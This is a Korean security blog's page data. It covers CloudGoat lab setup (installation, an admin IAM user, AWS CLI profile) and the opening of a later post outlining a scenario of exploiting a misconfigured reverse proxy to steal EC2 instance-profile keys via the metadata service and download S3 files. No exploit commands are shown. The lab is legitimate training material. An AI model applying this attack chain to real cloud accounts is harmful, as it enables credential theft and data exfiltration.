{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/cloud-service-vuln-1/",
    "result": {"data":{"cur":{"id":"c9d7e71f-e3df-5a7e-9d54-77d8ff5ae8f2","html":"<h1 id=\"클라우드-서비스-취약점-분석-1\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-1\" aria-label=\"클라우드 서비스 취약점 분석 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 서비스 취약점 분석 1</h1>\n<aside>\n💡  클라우드 서비스 취약점 분석 연습을 위해 Rhino Security Lab의 CloudGoat 실습을 진행하도록 하겠습니다.\n<p>다음은 참조 CloudGoat Github 링크입니다.</p>\n<p><a href=\"https://github.com/RhinoSecurityLabs/cloudgoat\">https://github.com/RhinoSecurityLabs/cloudgoat</a></p>\n</aside>\n<h1 id=\"실습-환경-구성\" style=\"position:relative;\"><a href=\"#%EC%8B%A4%EC%8A%B5-%ED%99%98%EA%B2%BD-%EA%B5%AC%EC%84%B1\" aria-label=\"실습 환경 구성 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>실습 환경 구성</h1>\n<h3 id=\"필수-설치-패키지\" style=\"position:relative;\"><a href=\"#%ED%95%84%EC%88%98-%EC%84%A4%EC%B9%98-%ED%8C%A8%ED%82%A4%EC%A7%80\" aria-label=\"필수 설치 패키지 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>필수 설치 패키지</h3>\n<ul>\n<li>Linux or MacOS. Windows is not officially supported.\n<ul>\n<li>Argument tab-completion requires bash 4.2+ (Linux, or OSX with some difficulty).</li>\n</ul>\n</li>\n<li>Python3.6+ is required.</li>\n<li>Terraform >= 0.14 <a href=\"https://learn.hashicorp.com/terraform/getting-started/install.html\">installed and in your $PATH</a>.</li>\n</ul>\n<p><a href=\"https://learn.hashicorp.com/tutorials/terraform/install-cli\">Install Terraform | Terraform - HashiCorp Learn</a></p>\n<ul>\n<li>The AWS CLI <a href=\"https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-install.html\">installed and in your $PATH</a>, and an AWS account with sufficient privileges to create and destroy resources.</li>\n<li><a href=\"https://stedolan.github.io/jq/\">jq</a></li>\n</ul>\n<p><a href=\"https://stedolan.github.io/jq/\">jq</a></p>\n<h3 id=\"설치\" style=\"position:relative;\"><a href=\"#%EC%84%A4%EC%B9%98\" aria-label=\"설치 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>설치</h3>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">$ git <span class=\"token keyword\">clone</span> https<span class=\"token punctuation\">:</span><span class=\"token comment\">//github.com/RhinoSecurityLabs/cloudgoat.git</span>\n$ cd <span class=\"token class-name type-declaration\">cloudgoat</span>\n$ pip3 install <span class=\"token operator\">-</span>r <span class=\"token operator\">.</span><span class=\"token operator\">/</span>core<span class=\"token operator\">/</span>python<span class=\"token operator\">/</span>requirements<span class=\"token operator\">.</span><span class=\"token class-name type-declaration\">txt</span>\n$ chmod u<span class=\"token operator\">+</span>x cloudgoat<span class=\"token operator\">.</span>py</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 17.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAo0lEQVQI13WOOw6CQAAFUQmxUxIMirKAyB92RQSjUGii9z/SGCmNFq+YYiZPi5ITrlewskO8oGQnMhxRsHZz9gfF1k3Zxxkikdi+QjcsJrMlU938OS2Ma4RfYm8imvaBPA5I1VPJG931SZp3VGqgu72QTc/MMNGmi1H+hL/jWpK1eEHF2olR9UBRXcnKC1HacDrfidNm5CBvcbwI0xIY89Xfl28E+0/iErUWYgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/e4fa6c27ca6e77a3c59139f0577597f1/37523/0.png\"\n        srcset=\"/static/e4fa6c27ca6e77a3c59139f0577597f1/e9ff0/0.png 180w,\n/static/e4fa6c27ca6e77a3c59139f0577597f1/f21e7/0.png 360w,\n/static/e4fa6c27ca6e77a3c59139f0577597f1/37523/0.png 720w,\n/static/e4fa6c27ca6e77a3c59139f0577597f1/71c8e/0.png 875w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAq0lEQVQY03WQ3QoCIRCF9/0fL+hy6SaiHdPWn1x1XE+MVhCRcGD8js5wZopxwyNu2PcdtdYfCW+t/RXXCuaCmTbMlDA550BEMEbDGANrLdZ17bLOwns/6hf/8q3tf4zWOJ4Ih/mKKYSA82XBojTU7Q4ZII+11r0ZKcJC1JkMlibivWtSqt9jcHh4i0kipVzBVSKPeMKYGWhAKhm5lBGP+ePLOuQkzmM1wlvDE3dkNSM8iDotAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"1\"\n        title=\"1\"\n        src=\"/static/9e04904dd6fc1d129d314db67fedd32e/37523/1.png\"\n        srcset=\"/static/9e04904dd6fc1d129d314db67fedd32e/e9ff0/1.png 180w,\n/static/9e04904dd6fc1d129d314db67fedd32e/f21e7/1.png 360w,\n/static/9e04904dd6fc1d129d314db67fedd32e/37523/1.png 720w,\n/static/9e04904dd6fc1d129d314db67fedd32e/302a4/1.png 1080w,\n/static/9e04904dd6fc1d129d314db67fedd32e/07a9c/1.png 1440w,\n/static/9e04904dd6fc1d129d314db67fedd32e/99375/1.png 1525w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>IAM 사용자 추가를 누른 후 AWS IAM Full-Admin 권한의 사용자 생성을 진행하여 cloudgoat 환경에서 다양한 인스턴스및 여러 기능들을 수행할 수 있도록 환경 구성을 진행해야 합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAABWElEQVQ4y52Ty07DMBBF/e98CztW7PgAVrBFQhVCiCpN82iS+v2IfZHtNmpKgJaRjpxxkhlf6w6hdA8pJWJ47ydCCIml/HT/HILzCAH7fW6itYZSCkKIBGMcxpjDZ2ER4p2FcxbjmDuM44i+71PRCOc8FXNunH76LYjTHIZ1aJsadV2jLEtsNiWqqkp5PNFP8hYlr3cat48F3koK70ySqXVe/xOk6jkent6x+thACjZJjQzDcDXEWYN6vcJ2u0XVdOj7YSp2WvxSyOgDjKSQSkMoC2PdzCbXQpxz4EKCMQbOWVqjZZY8eVFB70coKSA4Az3Y5Mi5uY+2Olpsvp/fESEVimqHz3pA0+7Qtjt0XYeqqtE0LeqmAaVs8iOlNOVCyNyYcTCalUXIa0Fxc/eC++cCWuVpiJaJV2GtTfxl5plt4nGN1rBGZw8qnSTMp/H7DOfngODnV/IFFqf1Xxjnq18AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"0\"\n        title=\"0\"\n        src=\"/static/ddc19233c1789764932065ff72685f2c/37523/2.png\"\n        srcset=\"/static/ddc19233c1789764932065ff72685f2c/e9ff0/2.png 180w,\n/static/ddc19233c1789764932065ff72685f2c/f21e7/2.png 360w,\n/static/ddc19233c1789764932065ff72685f2c/37523/2.png 720w,\n/static/ddc19233c1789764932065ff72685f2c/91b29/2.png 983w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>AdministratorAccess 정책 권한을 설정한후 해당 access-key, secret-key를 저장하여 AWS cli profile를 설정을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">$ aws configure <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile cloudgoat\n\ncat <span class=\"token operator\">~</span><span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>aws<span class=\"token operator\">/</span>credentials\n<span class=\"token punctuation\">[</span>cloudgoat<span class=\"token punctuation\">]</span>\naws_access_key_id <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_KEY<span class=\"token operator\">></span>\naws_secret_access_key <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_SECRET_KEY<span class=\"token operator\">></span>\ncat <span class=\"token operator\">~</span><span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>aws<span class=\"token operator\">/</span>config\n<span class=\"token punctuation\">[</span>cloudgoat<span class=\"token punctuation\">]</span>\nregion <span class=\"token operator\">=</span> us<span class=\"token operator\">-</span>east<span class=\"token operator\">-</span><span class=\"token number\">1</span>\n</code></pre></div>\n<ul>\n<li>설정이 완료되면 credentials, config 파일에 각각 저장이 됩니다.</li>\n<li>앞에서 설정한 각 정보들을 그대로 cloudgoat 에 적용하여 설치를 마무리 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">$ <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>cloudgoat<span class=\"token punctuation\">.</span>py config profile\n$ <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>cloudgoat<span class=\"token punctuation\">.</span>py config whitelist <span class=\"token operator\">-</span><span class=\"token operator\">-</span>auto</code></pre></div>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%ED%95%84%EC%88%98-%EC%84%A4%EC%B9%98-%ED%8C%A8%ED%82%A4%EC%A7%80\">필수 설치 패키지</a></li>\n<li><a href=\"#%EC%84%A4%EC%B9%98\">설치</a></li>\n</ul>\n</div>","excerpt":"클라우드 서비스 취약점 분석 1 다음은 참조 CloudGoat Github 링크입니다. https://github.com/RhinoSecurityLabs/cloudgoat 실습 환경 구성 필수 설치 패키지 Linux or MacOS. Windows is not officially supported. Argument tab-completion requires bash 4.2+ (Linux, or OSX with some difficulty). Python3.6+ is required. Terraform >= 0.14 installed and in your $PATH. Install Terraform | Terraform - HashiCorp Learn The AWS CLI installed and in your $PATH, and an AWS account with sufficient privileges to create and destroy resources. jq jq 설치   …","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 1 (클라우드 서비스 취약점 및 공격 벡터)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-1/"}},"next":{"id":"cbd8c0f7-ec77-5d99-8436-43038a368e52","html":"<h1 id=\"클라우드-서비스-취약점-분석-4\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-4\" aria-label=\"클라우드 서비스 취약점 분석 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 서비스 취약점 분석 4</h1>\n<h1 id=\"scenario-3--cloud-breach-s3\" style=\"position:relative;\"><a href=\"#scenario-3--cloud-breach-s3\" aria-label=\"scenario 3  cloud breach s3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[Scenario 3]:  Cloud Breach s3</h1>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">Size: Small\nDifficulty: Moderate\nCommand: $ ./cloudgoat.py create cloud_breach_s3</code></pre></div>\n<h2 id=\"시나리오-개요\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\" aria-label=\"시나리오 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 개요</h2>\n<h3 id=\"자원\" style=\"position:relative;\"><a href=\"#%EC%9E%90%EC%9B%90\" aria-label=\"자원 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>자원</h3>\n<ul>\n<li>VPC (EC2, S3)</li>\n</ul>\n<h3 id=\"취약점\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점</h3>\n<ul>\n<li>개발자의 실수로 인한 ReverseProxy 환경 구성 미흡</li>\n<li>설정 값이 잘못 구성되어 Reverse Proxy로 동작하는 EC2 서버의 IP 주소</li>\n</ul>\n<h3 id=\"목표\" style=\"position:relative;\"><a href=\"#%EB%AA%A9%ED%91%9C\" aria-label=\"목표 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>목표</h3>\n<ul>\n<li>S3 bucket에서 Confidential files을 다운로드 합니다.</li>\n<li>액세스 권한이 없는 상태인 외부 접근자로 시나리오는 시작합니다. 설정이 잘못된 Reverse Proxy server를 Exploit하여 EC2 MetaData Service를 통해 인스턴스 프로필 키를 획득합니다. 그런 다음 해당 키를 사용하여 S3 Bucket에서 권한을 우회하여 데이터를 추출합니다.</li>\n</ul>\n<h3 id=\"exploit-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 흐름도</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAADRElEQVQoz02SX0xTdxTHj1Pa+7stBSRpb/v73Vt6W0sprNgsUArtNKxDWm5BMGoRccw5txn/bJOZGTdl04QtaqkwIyhIolHqMrNMEEVtwgNGl7GaLG6Z2Ysxe9r2sE1UejU55uqy+HAezsk533y++R6QZZfRW17Z6PX6/IgI1bWNHwTqYt9V10bPBsNKOhbvSMeaO9JKS2d6RVMiXROKpQN10TFtpyq4IqHdyE43zxgjjDEdiKJEPJ5yR6mnggGAJvhFoC72c3Vt9GYwrPygtHZl461d2ZZVG7Ox5s5sMNycrQnFZ2tC8V+rQ807cK4CZNll+E9QD5RSjid5i4oK8/O04eQswpZdp2Dnxyfg/eRt2H0eYd8FhOPXEUZmELpP3ofukfuw4dCfkBhC+BERJJePUKuFUEr1wBjjRMaIKNnJkuBKgz/clO9/vasgH0AfejcjN+zPZdYk1RubjuWubh3OZd4ZzGU2D+audR6Zv9rUq/4U+ezhIc2Z0xcxiHZZI7RxTLQTodjE3UOEOUT4GxEmESG4+QqL9DxIRQ/Mf736sHprXUr9fm1SnW1PqbPxXnWm4fNHY5G9/+wAgJfk8jDPpBI9SLKbE0x5nGfZKuNrw/92rhn+bWfryO8fLT/2VwQAFm7NIkQ/nLavTeYmEn1qJtGnTnccUacThx8c1ALpRwSHt46nNuG5ZYc3QAoAdJXrR4ob+x//8dbAL7h+4C5GUk/SQ4jgbztYpBGEtmdf7kg9mtrQP3+t7cu5o4tLwkbZHze6q9oM1CZw/4dS4vSRChPo4ZVMQU/PpXN9ewduJXtO3O7+dGa3RlBf5Sa2cYRRRFj+9nlTZNcdsb79AKm9ggCIQB0+ntksHKUvpMxEiZjNxVwp8KQQ2nkK9TyDIuIVQLfA9d5iU8N4L2udGrYok19ZW6ZOmpWLA2bl8mndq9+8qYkKrrCBUvpcUEtZa0RRJFa3xEmlHMc8Js7qLiNlFtAvcr5RaIp8u42tvLhPiE98YlHG9wjKxB5z08R+XWis5TTAAsEZ4F/8Q71GSSnj7PZS4nCUPStJkjkrtXNu20K98SjCsjMI/lGEylGEpaMIZf0I8BDB5qgkzGZ+BkUp1T0FXJ4gj4FcqqIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"29.png\"\n        title=\"29.png\"\n        src=\"/static/47ff7d97423579247e2d9cb0309d3849/37523/29.png\"\n        srcset=\"/static/47ff7d97423579247e2d9cb0309d3849/e9ff0/29.png 180w,\n/static/47ff7d97423579247e2d9cb0309d3849/f21e7/29.png 360w,\n/static/47ff7d97423579247e2d9cb0309d3849/37523/29.png 720w,\n/static/47ff7d97423579247e2d9cb0309d3849/302a4/29.png 1080w,\n/static/47ff7d97423579247e2d9cb0309d3849/07a9c/29.png 1440w,\n/static/47ff7d97423579247e2d9cb0309d3849/4435f/29.png 2479w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"시나리오-환결설정\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%B0%EC%84%A4%EC%A0%95\" aria-label=\"시나리오 환결설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 환결설정</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABnklEQVQoz32RWW/aQBSFh8UBx2Bs45XFNsYLxhjCkhZSNe1D2///j75qJhGqorYPn+be2XTOuWK7+8yn2w+Ol2/sDi9cX34qzs/fOZ5f2e6uNPsbty+/SLKWp9Orute0Vwa6h+iYdHoWomu9rXHaUlYX1sWRZNVS1c+KvDyR5U8sk4bV+kC5uajzNNsrkmyPF6zxwpxoXimGjwHCdEMM20c3XYZjV62abmNYPg+Ggz7xGIymGHbA2Anp9CZKlehO6PZteppzR/bCi1LcIMUYzzDGESNzxsicM9B9tTdxYh5HobIjH/yJ3PuIsiwtShvSmkTWcbpjtqhVH69agqh4y+xd2b8QModFvMVxU4KoxA9z3GDNfFkTzkrsafJ+VmA58f3DvylWH8qwD6evFNVZBV/VF8r6ogYieznlZbxl6q3QjZBO16Lb+6/CnEXcKDWyVlOTtZ+pHLWhx8MoQDN8RH+C0CxE30LI4Sg+ZGiMQ+K0YRHXzJcbkrQhTFv8ZU00L5gFORt/Sx3t2IQNhVuRmBleP8Tp++iajTaY3hX+Bmt65OjIyAcbAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"0\"\n        title=\"0\"\n        src=\"/static/caaff94dfd459777f1bda4ea4433d145/37523/0.png\"\n        srcset=\"/static/caaff94dfd459777f1bda4ea4433d145/e9ff0/0.png 180w,\n/static/caaff94dfd459777f1bda4ea4433d145/f21e7/0.png 360w,\n/static/caaff94dfd459777f1bda4ea4433d145/37523/0.png 720w,\n/static/caaff94dfd459777f1bda4ea4433d145/84cc5/0.png 898w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"exploit-시나리오-흐름도\" 